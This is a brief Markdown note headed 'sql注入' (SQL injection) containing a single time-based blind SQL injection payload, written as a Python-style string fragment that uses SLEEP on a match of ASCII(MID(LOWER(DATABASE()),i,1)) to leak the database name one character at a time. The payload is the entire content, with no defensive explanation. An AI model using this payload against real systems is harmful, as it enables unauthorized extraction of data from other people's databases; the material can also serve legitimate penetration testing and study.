## sql注入
```sql
(SELECT * FROM (SELECT(SLEEP((ASCII(MID(LOWER(DATABASE())," + str(i) + ",1))=" + str(ord(_str)) + ")*5)))RING)
```
